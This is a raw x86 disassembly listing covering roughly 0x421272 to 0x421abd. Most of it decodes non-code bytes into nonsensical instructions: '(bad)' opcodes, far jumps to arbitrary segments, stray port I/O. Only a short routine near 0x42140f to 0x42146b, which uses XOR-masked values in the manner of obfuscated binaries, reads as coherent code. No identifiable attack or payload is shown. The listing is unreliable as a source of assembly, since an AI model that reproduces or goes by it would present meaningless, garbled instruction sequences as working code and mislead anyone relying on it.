  421272:	mov    BYTE PTR [edx-0x32],ch
  421275:	sub    ebx,DWORD PTR [edi]
  421277:	push   ebx
  421278:	sbb    BYTE PTR [eax],0xaa
  42127b:	mov    eax,0xe8979e1c
  421280:	sbb    bl,BYTE PTR [edx+0x24ae607b]
  421286:	add    ch,BYTE PTR ds:0x5a9724ec
  42128c:	outs   dx,BYTE PTR ds:[esi]
  42128d:	xchg   esp,eax
  42128e:	stos   BYTE PTR es:[edi],al
  42128f:	jle    0x421267
  421291:	shr    DWORD PTR ds:0x83de3aa7,1
  421297:	ror    edi,cl
  421299:	imul   esp,DWORD PTR [esi+0x73],0xef0de6c2
  4212a0:	mov    eax,0x8772cefd
  4212a5:	pop    ds
  4212a6:	mov    edx,0x5cd18ceb
  4212ab:	mov    ds:0xe822267c,eax
  4212b0:	fnsave [ebx+0x20]
  4212b3:	imul   edx,DWORD PTR [edx+0x19d18376],0x83511115
  4212bd:	lods   al,BYTE PTR ds:[esi]
  4212be:	test   al,0xd
  4212c0:	jmp    0x9604:0xe90b72ac
  4212c7:	mov    DWORD PTR [edi+ebx*4-0x3c35ed69],ebp
  4212ce:	mov    bh,0xb6
  4212d0:	adc    ah,BYTE PTR ds:0x754bb954
  4212d6:	ret    0x706a
  4212d9:	add    eax,0x345cdf38
  4212de:	pop    ecx
  4212df:	push   esp
  4212e0:	or     eax,0x65aaa544
  4212e5:	sbb    BYTE PTR [esi+0x33906452],dl
  4212eb:	lock ss ins BYTE PTR es:[edi],dx
  4212ee:	sub    cl,ah
  4212f0:	fninit 
  4212f2:	mov    bl,0x34
  4212f4:	jae    0x4212a1
  4212f6:	jg     0x421342
  4212f8:	outs   dx,BYTE PTR ds:[esi]
  4212f9:	pop    edx
  4212fa:	dec    edx
  4212fb:	inc    esp
  4212fc:	(bad)  
  4212fd:	in     al,0x8f
  4212ff:	push   ss
  421300:	fsub   QWORD PTR [esi+0x19b7cd1b]
  421306:	sbb    esi,DWORD PTR [ebp+0x6f2c2c39]
  42130c:	(bad)  
  42130d:	jbe    0x421345
  42130f:	nop
  421310:	pop    ss
  421311:	dec    ebp
  421312:	and    DWORD PTR [ecx],esp
  421314:	push   esp
  421315:	sahf   
  421316:	out    dx,eax
  421317:	sub    eax,0xca124891
  42131c:	imul   edx,DWORD PTR [ebx],0x6e
  42131f:	fbstp  TBYTE PTR [ebx]
  421321:	push   ss
  421322:	cli    
  421323:	adc    BYTE PTR [esi],dh
  421325:	iret   
  421326:	jno    0x4212f2
  421328:	leave  
  421329:	mov    ebx,0x174e3758
  42132e:	das    
  42132f:	mov    dl,0xe7
  421331:	pop    ss
  421332:	mov    ch,dl
  421334:	cs xchg edx,eax
  421336:	push   ds
  421337:	stos   DWORD PTR es:[edi],eax
  421338:	icebp  
  421339:	xchg   esp,eax
  42133a:	xchg   esi,eax
  42133b:	sbb    eax,0xd016efe5
  421340:	or     DWORD PTR [ecx+0x5f],edx
  421343:	es leave 
  421345:	push   esp
  421346:	adc    DWORD PTR [bx+di+0x71],eax
  42134a:	mov    dl,0x74
  42134c:	dec    edx
  42134d:	xchg   ebp,eax
  42134e:	cwde   
  42134f:	addr16 or eax,0x8f5b5a7a
  421355:	lea    ecx,[ebp-0x3c0260a8]
  42135b:	pop    ecx
  42135c:	arpl   WORD PTR [edi],si
  42135e:	xchg   ecx,eax
  42135f:	mov    eax,0x10a61cd
  421364:	jbe    0x42130c
  421366:	mov    al,ds:0x39d01f3b
  42136b:	mov    ebp,0xdf1d33f3
  421370:	iret   
  421371:	mov    eax,0x5b11e316
  421376:	lock inc edi
  421378:	pop    ss
  421379:	and    bh,BYTE PTR [edi-0x656c589a]
  42137f:	push   cs
  421380:	std    
  421381:	jbe    0x421311
  421383:	xor    DWORD PTR [edi],ebx
  421385:	outs   dx,BYTE PTR ds:[esi]
  421386:	pop    edx
  421387:	bound  ebp,QWORD PTR gs:[ecx-0x3fc8cedb]
  42138e:	popf   
  42138f:	jbe    0x421368
  421391:	mov    esi,0x7cda10aa
  421396:	imul   ebx,ebp,0x716bac0f
  42139c:	test   DWORD PTR [edx],0x60c36a49
  4213a2:	pop    ecx
  4213a3:	push   edi
  4213a4:	in     eax,dx
  4213a5:	repnz mov edi,DWORD PTR [eax]
  4213a8:	cs cmc 
  4213aa:	outs   dx,BYTE PTR ds:[esi]
  4213ab:	adc    bl,al
  4213ad:	push   0x70
  4213af:	xchg   edi,eax
  4213b0:	or     edi,edx
  4213b2:	mov    ds:0x7d40b99a,eax
  4213b7:	out    dx,eax
  4213b8:	jb     0x421433
  4213ba:	das    
  4213bb:	sub    eax,0x6341cded
  4213c0:	mov    ebx,0x3ecfe227
  4213c5:	dec    ebp
  4213c6:	ror    DWORD PTR [esi-0x2d75082e],cl
  4213cc:	(bad)  
  4213ce:	(bad)  
  4213cf:	aam    0xd2
  4213d1:	inc    esp
  4213d2:	cmp    al,0x99
  4213d4:	inc    esp
  4213d5:	cdq    
  4213d6:	inc    ebp
  4213d7:	in     al,dx
  4213d8:	inc    esp
  4213d9:	cdq    
  4213da:	test   al,0xe1
  4213dc:	addr16 fucomp st(1)
  4213df:	or     eax,0xb5f94118
  4213e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4213e5:	jbe    0x421400
  4213e7:	shl    edx,1
  4213e9:	daa    
  4213ea:	sub    bl,BYTE PTR [edi]
  4213ec:	cmp    dl,BYTE PTR cs:[ecx]
  4213ef:	outs   dx,DWORD PTR ds:[esi]
  4213f0:	(bad)  
  4213f1:	fnsave [ebp+0x47e7a246]
  4213f7:	fsubr  DWORD PTR [esi+0x527746be]
  4213fd:	pop    ecx
  4213fe:	shl    DWORD PTR [edx-0x2f],cl
  421401:	push   eax
  421402:	inc    ecx
  421403:	pop    eax
  421404:	and    ebp,DWORD PTR [edi-0x1e16aa1]
  42140a:	popf   
  42140b:	js     0x4213b1
  42140d:	leave  
  42140e:	push   esp
  42140f:	mov    ecx,DWORD PTR [ebp+0x8]
  421412:	xor    ecx,eax
  421414:	add    ecx,esi
  421416:	jne    0x41f07f
  42141c:	jmp    0x421467
  421421:	mov    ecx,DWORD PTR [ebp+0x8]
  421424:	mov    edx,DWORD PTR [ebp-0x8]
  421427:	xor    ecx,eax
  421429:	xor    edx,eax
  42142b:	sub    ecx,edx
  42142d:	sub    ecx,esi
  42142f:	xor    ecx,eax
  421431:	mov    DWORD PTR [ebp+0x8],ecx
  421434:	mov    ecx,DWORD PTR [ebp+0x8]
  421437:	mov    edx,DWORD PTR [ebp+0x8]
  42143a:	xor    ecx,eax
  42143c:	imul   edx,edx,0x5708f5
  421442:	add    ecx,esi
  421444:	lea    ecx,[ebp+ecx*4-0x64]
  421448:	mov    edi,DWORD PTR [ecx]
  42144a:	add    edx,edi
  42144c:	mov    DWORD PTR [ecx],edx
  42144e:	mov    ecx,DWORD PTR [ebp+0x8]
  421451:	xor    ecx,eax
  421453:	add    ecx,esi
  421455:	jne    0x421421
  42145b:	mov    ecx,DWORD PTR [ebp-0x8]
  42145e:	xor    ecx,eax
  421460:	mov    eax,DWORD PTR [ebp+0x10]
  421463:	add    ecx,esi
  421465:	mov    DWORD PTR [eax],ecx
  421467:	pop    edi
  421468:	pop    esi
  421469:	pop    ebx
  42146a:	leave  
  42146b:	ret    0xc
  42146e:	pop    ss
  42146f:	or     al,0x84
  421471:	repz lahf 
  421473:	sti    
  421474:	ja     0x421462
  421476:	stos   BYTE PTR es:[edi],al
  421477:	mov    edx,0xe00b88e2
  42147c:	call   0x5a00:0x1cd778b
  421483:	add    BYTE PTR [eax],al
  421485:	add    bl,ah
  421487:	adc    dl,BYTE PTR [ebx+eiz*4+0x57]
  42148b:	loop   0x421438
  42148d:	inc    ebp
  42148e:	adc    al,0x96
  421490:	in     al,0x3e
  421492:	add    edi,ecx
  421494:	jle    0x42142e
  421496:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421497:	xor    eax,DWORD PTR [ebp-0x6c]
  42149a:	out    0x97,eax
  42149c:	stos   DWORD PTR es:[edi],eax
  42149d:	clc    
  42149e:	ret    
  42149f:	xlat   BYTE PTR ds:[ebx]
  4214a0:	push   eax
  4214a1:	push   0x4
  4214a3:	dec    ebx
  4214a4:	sbb    ah,dl
  4214a6:	jg     0x421432
  4214a8:	push   0xffffffe2
  4214aa:	inc    esp
  4214ab:	fild   QWORD PTR [eax-0x51]
  4214ae:	inc    ebx
  4214af:	sbb    al,0x52
  4214b1:	icebp  
  4214b2:	pop    ebx
  4214b3:	push   ss
  4214b4:	cli    
  4214b5:	sbb    eax,0xa2591017
  4214ba:	or     eax,DWORD PTR [ebp+0x38]
  4214bd:	jbe    0x421535
  4214bf:	and    eax,0x1649dc2b
  4214c4:	xchg   esp,eax
  4214c5:	and    bh,BYTE PTR [eax+0x4]
  4214c8:	adc    DWORD PTR [edi-0x7d],esi
  4214cb:	fisub  DWORD PTR [edx]
  4214cd:	jg     0x4214bf
  4214cf:	or     ch,BYTE PTR [esi]
  4214d1:	int    0x8
  4214d3:	mov    BYTE PTR [eax+0x5a],ch
  4214d6:	adc    ecx,edx
  4214d8:	lahf   
  4214d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4214da:	ret    
  4214db:	dec    ebx
  4214dc:	test   dh,0x8e
  4214df:	enter  0x0,0x0
	...
  4214eb:	add    BYTE PTR [eax],al
  4214ed:	add    cl,dl
  4214ef:	sub    al,0x14
  4214f1:	adc    edi,ebp
  4214f3:	cmp    edx,edi
  4214f5:	out    dx,al
  4214f6:	pop    edi
  4214f7:	xchg   bx,ax
  4214f9:	push   0xd6033436
  4214fe:	ror    ebp,1
  421500:	add    DWORD PTR [eax],eax
  421502:	pop    edx
  421503:	add    BYTE PTR [eax],al
  421505:	add    dl,al
  421507:	sbb    ebp,ecx
  421509:	daa    
  42150a:	xor    esp,DWORD PTR [esi-0xce8f475]
  421510:	adc    ah,BYTE PTR [ebp-0x4b]
  421513:	out    0x42,al
  421515:	and    edx,DWORD PTR [eax+0x5151bba9]
  42151b:	dec    esp
  42151c:	(bad)  
  42151d:	fiadd  WORD PTR [ecx+0x10]
  421520:	call   eax
  421522:	xor    eax,0x64c07c3b
  421527:	adc    eax,0x154546f
  42152c:	sbb    al,0x2f
  42152e:	(bad)  
  421530:	push   edi
  421531:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421532:	mov    esi,0xe36aeaaf
  421537:	xor    BYTE PTR [esi+0x2ecdba4c],bh
  42153d:	enter  0x3b61,0xfb
  421541:	jl     0x421514
  421543:	inc    eax
  421544:	xchg   ebp,eax
  421545:	push   0xb883d821
  42154a:	loopne 0x4214fd
  42154c:	push   ss
  42154d:	in     eax,dx
  42154e:	(bad)  
  421550:	mov    ecx,0xc1ccfbe6
  421555:	add    edi,DWORD PTR [ecx+eiz*1+0x7984d601]
  42155c:	(bad)
	...
  42156c:	add    BYTE PTR [eax],al
  42156e:	pop    ds
  42156f:	sub    esp,DWORD PTR [eax-0x60404bc1]
  421575:	sub    eax,esi
  421577:	add    BYTE PTR [edi+eax*2+0x7ca192b5],0x2b
  42157f:	into   
  421580:	add    DWORD PTR [eax],eax
  421582:	pop    edx
  421583:	add    BYTE PTR [eax],al
  421585:	add    BYTE PTR [edx-0x4a7f10b3],ch
  42158b:	push   eax
  42158c:	push   0xffffff91
  42158e:	jmp    0x26098e6b
  421593:	sub    DWORD PTR [ecx-0x91d033f],ebx
  421599:	mov    eax,0xcf010f63
  42159e:	in     al,dx
  42159f:	dec    ebx
  4215a0:	xchg   BYTE PTR [ebx+0x716cee77],ah
  4215a6:	out    0x82,eax
  4215a8:	adc    edx,0x5d
  4215ab:	xchg   BYTE PTR [esi-0x61],ch
  4215ae:	sub    bh,ah
  4215b0:	idiv   BYTE PTR [ebx-0xfb61afa]
  4215b6:	cli    
  4215b7:	or     eax,0xf372b675
  4215bc:	adc    DWORD PTR [esi+0x13b1a04c],ebx
  4215c2:	scas   al,BYTE PTR es:[edi]
  4215c3:	mov    ecx,0x65eebc3f
  4215c8:	cli    
  4215c9:	and    DWORD PTR ds:0x6f3e39f6,ebp
  4215cf:	xchg   BYTE PTR [eax+0x7fa8d19d],ch
  4215d5:	(bad)  
  4215d6:	mov    edi,0xb41143ab
  4215db:	and    BYTE PTR [edx+0x39d84a],bh
	...
  4215ed:	add    BYTE PTR [edi],ch
  4215ef:	and    al,0xf0
  4215f1:	aam    0xfb
  4215f3:	aam    0x2f
  4215f5:	jmp    FWORD PTR [esi+0x33]
  4215f8:	je     0x4215b0
  4215fa:	loope  0x421643
  4215fc:	inc    esi
  4215fd:	mov    esi,0x1ce85
  421602:	pop    edx
  421603:	add    BYTE PTR [eax],al
  421605:	add    BYTE PTR [edx-0x5d4d9617],al
  42160b:	clc    
  42160c:	mov    edx,0xea406e44
  421611:	shl    DWORD PTR [edx],0x26
  421614:	int3   
  421615:	jle    0x421624
  421617:	jmp    0x3643444f
  42161c:	jo     0x421613
  42161e:	aad    0xf0
  421620:	sbb    ch,BYTE PTR [eax+ebx*2-0x62b89914]
  421627:	sub    al,ah
  421629:	jnp    0x421696
  42162b:	ss call 0xa36dfd0e
  421631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421632:	sub    BYTE PTR [edx+0xf00e130],0xd5
  421639:	test   al,0x86
  42163b:	scas   eax,DWORD PTR es:[edi]
  42163c:	mov    eax,DWORD PTR [ecx+0x53261785]
  421642:	jecxz  0x4215c7
  421644:	or     BYTE PTR [ecx],dh
  421646:	push   ecx
  421647:	out    0x90,eax
  421649:	sbb    al,0x9f
  42164b:	and    ecx,ebx
  42164d:	fmul   DWORD PTR [edx]
  42164f:	pop    ecx
  421650:	add    ebp,DWORD PTR [edx+0x5f]
  421653:	sbb    eax,0xad4af60c
  421658:	mov    esi,0x4215e75f
  42165d:	sub    ecx,DWORD PTR [ebx+0x8d]
	...
  42166b:	add    BYTE PTR [eax],al
  42166d:	add    dl,cl
  42166f:	mov    al,ds:0xdf7e4d76
  421674:	sti    
  421675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421676:	mov    bh,0x83
  421678:	dec    edi
  421679:	mov    ds:0x46512882,al
  42167e:	(bad)  
  421680:	add    DWORD PTR [eax],eax
  421682:	pop    edx
  421683:	add    BYTE PTR [eax],al
  421685:	add    BYTE PTR [eax],ch
  421687:	pop    esi
  421688:	fidiv  WORD PTR [eax]
  42168a:	aaa    
  42168b:	pop    ebx
  42168c:	leave  
  42168d:	or     BYTE PTR [edi+0x4b],cl
  421690:	leave  
  421691:	data16 test BYTE PTR es:[edx-0x38a033ad],0xcc
  42169a:	das    
  42169b:	fisub  WORD PTR [ebx-0x5c]
  42169e:	aam    0x5b
  4216a0:	aas    
  4216a1:	js     0x42166e
  4216a3:	pop    edi
  4216a4:	cld    
  4216a5:	jmp    0x5750:0x7b730c70
  4216ac:	out    0x3d,eax
  4216ae:	mov    eax,0x3b1ce786
  4216b3:	or     cl,0xdf
  4216b6:	clc    
  4216b7:	lock fisttp WORD PTR [edi+0xd966a2f]
  4216be:	push   0x17
  4216c0:	and    eax,0x91ce0f10
  4216c5:	repnz add eax,edi
  4216c8:	xchg   DWORD PTR [esi-0x717b1013],eax
  4216ce:	pop    ecx
  4216cf:	dec    esi
  4216d0:	sub    BYTE PTR ds:0xea66b7e3,0xe2
  4216d7:	adc    eax,0x6f08db09
  4216dc:	adc    cl,BYTE PTR [esi-0x10]
  4216df:	dec    ebp
	...
  4216ec:	add    BYTE PTR [eax],al
  4216ee:	(bad)  
  4216ef:	out    dx,al
  4216f0:	lods   al,BYTE PTR ds:[esi]
  4216f1:	cmp    ch,BYTE PTR [edx+edi*2+0x5223fed6]
  4216f8:	stc    
  4216f9:	stc    
  4216fa:	idiv   BYTE PTR [eax]
  4216fc:	call   0x5a00:0x1cf3901
  421703:	add    BYTE PTR [eax],al
  421705:	add    BYTE PTR [edi],ch
  421707:	add    bh,cl
  421709:	push   cs
  42170a:	hlt    
  42170b:	inc    edx
  42170c:	stos   BYTE PTR es:[edi],al
  42170d:	cmp    ah,ah
  42170f:	dec    edx
  421710:	sbb    al,cl
  421712:	dec    edi
  421713:	stos   DWORD PTR es:[edi],eax
  421714:	jne    0x421795
  421716:	mov    esi,0x8728d987
  42171b:	xchg   esi,eax
  42171c:	cmp    BYTE PTR [edx-0x66dcf738],0x97
  421723:	sub    al,0x4a
  421725:	mov    ebp,0xb8ded2db
  42172a:	push   0xffffffc6
  42172c:	and    al,bl
  42172e:	jmp    0xfe92:0x27f092ef
  421735:	pop    DWORD PTR [ebp-0x6530e913]
  42173b:	pop    esp
  42173c:	push   edx
  42173d:	dec    ecx
  42173e:	or     bl,0x0
  421741:	xchg   edi,esi
  421743:	(bad)  
  421744:	xor    DWORD PTR ds:0x54ded0be,ebp
  42174a:	ins    DWORD PTR es:[edi],dx
  42174b:	cmp    BYTE PTR [edi-0xdc29e14],dl
  421751:	ret    0x4e73
  421754:	sbb    DWORD PTR [esi+0x42],0xfffffffd
  421758:	fisttp DWORD PTR [eax+0x147b26a7]
  42175e:	aas    
  42175f:	add    BYTE PTR [bx+si],al
	...
  42176e:	push   edx
  42176f:	xor    al,0x40
  421771:	gs data16 jne 0x4217ec
  421775:	aaa    
  421776:	push   0x5d6a4e09
  42177b:	gs ja  0x42175e
  42177e:	xchg   ebx,eax
  42177f:	iret   
  421780:	add    DWORD PTR [eax],eax
  421782:	pop    edx
  421783:	add    BYTE PTR [eax],al
  421785:	add    BYTE PTR [edi+0x6d],dl
  421788:	fucomp st(7)
  42178a:	mov    esp,0x89711fda
  42178f:	push   ds
  421790:	(bad)  
  421791:	cli    
  421792:	(bad)  
  421793:	and    al,0xbb
  421795:	nop
  421796:	mov    dl,0x39
  421798:	ins    BYTE PTR es:[edi],dx
  421799:	sbb    eax,0xbc6b715c
  42179e:	dec    esi
  42179f:	jb     0x421799
  4217a1:	pushf  
  4217a2:	add    edi,ecx
  4217a4:	mov    ecx,0xe43383ed
  4217a9:	imul   ebx,esi,0xffffffe1
  4217ac:	xor    BYTE PTR [ebx+ebx*1+0x19],al
  4217b0:	call   0xd6ac4246
  4217b5:	inc    ecx
  4217b6:	or     edx,0xffffffdc
  4217b9:	fwait
  4217ba:	jmp    0x730d:0x9695cdf5
  4217c1:	jecxz  0x4217c8
  4217c3:	and    ebx,DWORD PTR [edi+0x273c52a3]
  4217c9:	(bad)  
  4217ca:	dec    edi
  4217cb:	mov    ecx,0xd51c2cec
  4217d0:	stos   DWORD PTR es:[edi],eax
  4217d1:	and    BYTE PTR [ebx-0x4],dh
  4217d4:	ins    BYTE PTR es:[edi],dx
  4217d5:	mov    edx,0x76cb4659
  4217da:	aas    
  4217db:	rol    bl,0xcd
  4217de:	jmp    0x421852
	...
  4217eb:	add    BYTE PTR [eax],al
  4217ed:	add    BYTE PTR [ecx+0x46],cl
  4217f0:	sub    BYTE PTR [eax],dh
  4217f2:	das    
  4217f3:	jle    0x42184e
  4217f5:	jg     0x4217bd
  4217f7:	imul   esi,eax,0xffffffd5
  4217fa:	repnz clc 
  4217fc:	pop    esp
  4217fd:	aaa    
  4217fe:	daa    
  4217ff:	loope  0x421802
  421801:	add    BYTE PTR [edx+0x0],bl
  421804:	add    BYTE PTR [eax],al
  421806:	cmc    
  421807:	gs jl  0x42186b
  42180a:	jmp    0xb38f58ea
  42180f:	xchg   ebx,eax
  421810:	pop    ds
  421811:	mov    ds:0xe6ddb22,al
  421816:	dec    ebx
  421817:	mov    dh,BYTE PTR [esi]
  421819:	cmp    edx,DWORD PTR [esp+esi*1-0x3b294bc]
  421820:	push   eax
  421821:	loopne 0x4217db
  421823:	pushf  
  421824:	pushf  
  421825:	icebp  
  421826:	scas   al,BYTE PTR es:[edi]
  421827:	sub    DWORD PTR [edi+0x7298b1da],0xffffffc6
  42182e:	sbb    al,0x4f
  421830:	adc    al,0xd5
  421832:	xchg   edx,eax
  421833:	retf   
  421834:	sub    DWORD PTR [ebp+0x73],ecx
  421837:	mov    ebx,0x814769b7
  42183c:	test   BYTE PTR [ecx],cl
  42183e:	(bad)  
  42183f:	jbe    0x421839
  421841:	imul   edi,DWORD PTR [eax+0x6d],0xffffffd5
  421845:	push   esi
  421846:	push   cs
  421847:	jo     0x4217d2
  421849:	int3   
  42184a:	xor    ecx,DWORD PTR [edx+0x560c6a67]
  421850:	adc    ebp,ebx
  421852:	or     DWORD PTR [esi+0x69],eax
  421855:	pop    ss
  421856:	xor    al,0x24
  421858:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421859:	nop
  42185a:	jo     0x421894
  42185c:	jp     0x4218c5
  42185e:	mov    ecx,0xc6
	...
  42186b:	add    BYTE PTR [eax],al
  42186d:	add    BYTE PTR [edi-0x3a],ah
  421870:	and    dh,dh
  421872:	mov    eax,ds:0xe7d7f7f6
  421877:	mov    eax,0x1c67da72
  42187c:	xor    edi,DWORD PTR [edi]
  42187e:	and    ecx,0x5a0001
  421884:	add    BYTE PTR [eax],al
  421886:	mov    ecx,0x6625ef2e
  42188b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42188c:	pushf  
  42188d:	enter  0xa581,0x3b
  421891:	dec    esp
  421892:	add    BYTE PTR [ecx+0x58],dh
  421895:	mov    al,0x34
  421897:	sbb    BYTE PTR [ecx*1+0x42661c86],0xc9
  42189f:	or     al,BYTE PTR [ebp+0x2351b69a]
  4218a5:	adc    BYTE PTR [ecx-0x5a01f0bb],0x63
  4218ac:	push   0xfffffffd
  4218ae:	adc    DWORD PTR [edx-0xf3ee79b],0x21
  4218b5:	cmp    edi,DWORD PTR [ebp+0x11]
  4218b8:	pop    esi
  4218b9:	sar    dl,1
  4218bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218bc:	dec    eax
  4218bd:	outs   dx,BYTE PTR ds:[esi]
  4218be:	jg     0x42186d
  4218c0:	inc    esp
  4218c1:	mov    esp,0x7af689ac
  4218c6:	clc    
  4218c7:	repnz mov eax,ds:0x4d1ddc8e
  4218cd:	adc    eax,0xacb36d86
  4218d2:	repnz push esp
  4218d4:	arpl   WORD PTR [esi],dx
  4218d6:	in     al,0xec
  4218d8:	cmp    esi,DWORD PTR [ebx+0x1f]
  4218db:	imul   esp,DWORD PTR [eax],0xd0a457
	...
  4218ed:	add    bl,al
  4218ef:	or     eax,0xefee66a6
  4218f4:	ret    
  4218f5:	lods   eax,DWORD PTR ds:[esi]
  4218f6:	sub    al,0xb8
  4218f8:	mov    ds:0xf8c27647,eax
  4218fd:	(bad)  
  4218fe:	fndisi(8087 only) 
  421900:	add    DWORD PTR [eax],eax
  421902:	pop    edx
  421903:	add    BYTE PTR [eax],al
  421905:	add    BYTE PTR [ebp+ecx*2-0x72],ch
  421909:	icebp  
  42190a:	dec    DWORD PTR [ecx+0x3d]
  42190d:	push   ds
  42190e:	(bad)  
  42190f:	outs   dx,BYTE PTR ds:[esi]
  421910:	xchg   edi,eax
  421911:	ror    edx,1
  421913:	push   0x3
  421915:	add    edx,ecx
  421917:	push   edi
  421918:	(bad)  
  421919:	icebp  
  42191a:	and    BYTE PTR [eax],al
  42191c:	test   al,0xe6
  42191e:	cmp    esi,DWORD PTR [ecx-0x79dca8a4]
  421924:	aam    0xb
  421926:	clc    
  421927:	mov    ?,WORD PTR [edi-0x40]
  42192a:	ss and bl,bh
  42192d:	call   0x4307:0x93c00648
  421934:	adc    eax,ebp
  421936:	cdq    
  421937:	adc    DWORD PTR [ebx-0x53],esp
  42193a:	in     al,dx
  42193b:	sbb    ch,ch
  42193d:	lods   al,BYTE PTR ds:[esi]
  42193e:	(bad)  
  42193f:	fisttp DWORD PTR [edi]
  421941:	sub    al,0xe9
  421943:	jle    0x4218e8
  421945:	(bad)  
  421946:	mov    ebp,0xe6558093
  42194b:	stos   BYTE PTR es:[edi],al
  42194c:	jl     0x421919
  42194e:	call   0xcb01:0xda271af0
  421955:	stos   DWORD PTR es:[edi],eax
  421956:	jne    0x421915
  421958:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421959:	push   esi
  42195a:	pop    esi
  42195b:	or     DWORD PTR [esi],ebx
  42195d:	bswap  ebp
  42195f:	pop    edx
	...
  42196c:	add    BYTE PTR [eax],al
  42196e:	fld    st(2)
  421970:	add    eax,0xddcf1f49
  421975:	ror    al,cl
  421977:	outs   dx,DWORD PTR ds:[esi]
  421978:	clc    
  421979:	shr    BYTE PTR [ecx+ebp*1-0x1dca0eae],cl
  421980:	add    DWORD PTR [eax],eax
  421982:	pop    edx
  421983:	add    BYTE PTR [eax],al
  421985:	add    BYTE PTR [edi+0x32c7b438],ch
  42198b:	cmp    edx,DWORD PTR [esi]
  42198d:	not    DWORD PTR [eax]
  42198f:	mov    al,ds:0x5d20825c
  421994:	or     BYTE PTR [edx],dh
  421996:	fwait
  421997:	cmp    al,0x20
  421999:	ret    0xe54b
  42199c:	mov    esi,0x4ea963e5
  4219a1:	pop    ebx
  4219a2:	dec    eax
  4219a3:	pop    ds
  4219a4:	pop    ds
  4219a5:	and    al,0x72
  4219a7:	push   cs
  4219a8:	mov    ah,0xe8
  4219aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219ab:	std    
  4219ac:	pop    esp
  4219ad:	jns    0x42194a
  4219af:	ret    
  4219b0:	in     al,dx
  4219b1:	inc    ebp
  4219b2:	lock mov dl,0x6
  4219b5:	test   al,0x89
  4219b7:	sub    ah,bh
  4219b9:	ret    
  4219ba:	mov    eax,ds:0xb88283f0
  4219bf:	rcl    edx,0x7e
  4219c2:	repz sti 
  4219c4:	mov    esp,0x440552be
  4219c9:	fidiv  WORD PTR [edi]
  4219cb:	push   esp
  4219cc:	dec    edi
  4219cd:	cli    
  4219ce:	pop    edi
  4219cf:	xor    eax,0x54cb7a4c
  4219d4:	prefetchw (bad)
  4219d5:	or     eax,0xc030a2c8
  4219da:	inc    eax
  4219db:	sbb    BYTE PTR ds:[esi+0x581f],al
	...
  4219ee:	popa   
  4219ef:	pop    edi
  4219f0:	lock (bad) 
  4219f2:	(bad)  
  4219f3:	out    dx,eax
  4219f4:	repz pop edi
  4219f6:	mov    dl,0xc5
  4219f8:	ret    
  4219f9:	in     eax,dx
  4219fa:	call   0x1e2:0x8f607591
  421a01:	add    BYTE PTR ds:0x31000000,al
  421a07:	jns    0x421a6e
  421a09:	mov    ah,0x14
  421a0b:	add    BYTE PTR [eax],al
  421a0d:	add    BYTE PTR [eax],al
  421a0f:	nop
  421a10:	inc    edx
  421a11:	add    BYTE PTR [eax+edx*4],al
  421a14:	inc    edx
  421a15:	add    BYTE PTR [eax],cl
  421a17:	nop
  421a18:	inc    edx
  421a19:	add    BYTE PTR [eax+edx*4],cl
  421a1c:	inc    edx
  421a1d:	add    BYTE PTR [eax],dl
  421a1f:	nop
  421a20:	inc    edx
  421a21:	add    BYTE PTR [eax+edx*4],dl
  421a24:	inc    edx
  421a25:	add    BYTE PTR [eax],bl
  421a27:	nop
  421a28:	inc    edx
  421a29:	add    BYTE PTR [eax+edx*4],bl
  421a2c:	inc    edx
  421a2d:	add    BYTE PTR [eax],al
  421a2f:	mov    al,ds:0xa0040042
  421a34:	inc    edx
  421a35:	add    BYTE PTR [eax],cl
  421a37:	mov    al,ds:0xa00c0042
  421a3c:	inc    edx
  421a3d:	add    BYTE PTR [eax],dl
  421a3f:	mov    al,ds:0xa0140042
  421a44:	inc    edx
  421a45:	add    BYTE PTR [eax],bl
  421a47:	mov    al,ds:0xa01c0042
  421a4c:	inc    edx
  421a4d:	add    BYTE PTR [eax],al
  421a4f:	mov    al,0x42
  421a51:	add    BYTE PTR [eax+esi*4],al
  421a54:	inc    edx
  421a55:	add    BYTE PTR [eax],cl
  421a57:	mov    al,0x42
  421a59:	add    BYTE PTR [eax+esi*4],cl
  421a5c:	inc    edx
  421a5d:	add    BYTE PTR [eax],dl
  421a5f:	mov    al,0x42
  421a61:	add    BYTE PTR [eax+esi*4],dl
  421a64:	inc    edx
  421a65:	add    BYTE PTR [eax],bl
  421a67:	mov    al,0x42
  421a69:	add    BYTE PTR [eax+esi*4],bl
  421a6c:	inc    edx
  421a6d:	add    BYTE PTR [eax+0x66],bh
  421a70:	ins    BYTE PTR es:[edi],dx
  421a71:	jp     0x421aca
  421a73:	jbe    0x421abc
  421a75:	ja     0x421aba
  421a77:	js     0x421ac1
  421a79:	jno    0x421ade
  421a7b:	inc    edx
  421a7c:	inc    bx
  421a7e:	push   ebp
  421a7f:	jno    0x421af7
  421a81:	ja     0x421aea
  421a83:	dec    edi
  421a84:	dec    esp
  421a85:	dec    ebp
  421a86:	inc    edx
  421a87:	jno    0x421afa
  421a89:	jae    0x421ade
  421a8b:	push   eax
  421a8c:	arpl   WORD PTR [ebx+0x36],dx
  421a8f:	push   ds
  421a90:	inc    edx
  421a91:	add    BYTE PTR [esi],bh
  421a93:	push   ds
  421a94:	inc    edx
  421a95:	add    dh,dl
  421a97:	sbb    al,0x42
  421a99:	add    bh,ch
  421a9b:	or     esi,DWORD PTR [edx+0x304e790e]
  421aa1:	dec    esi
  421aa2:	xchg   DWORD PTR [edi+0x3d],ecx
  421aa5:	dec    esi
  421aa6:	scas   eax,DWORD PTR es:[edi]
  421aa7:	dec    edi
  421aa8:	ds dec esi
  421aaa:	js     0x421afa
  421aac:	cmp    ecx,DWORD PTR [esi-0x64]
  421aaf:	dec    edi
  421ab0:	inc    esp
  421ab1:	dec    esi
  421ab2:	jae    0x421b02
  421ab4:	inc    ecx
  421ab5:	dec    esi
  421ab6:	xor    BYTE PTR [esi+0x40],cl
  421ab9:	dec    esi
  421aba:	pop    esp
  421abb:	pop    ebp
  421abc:	pop    edi
  421abd:	push   edx
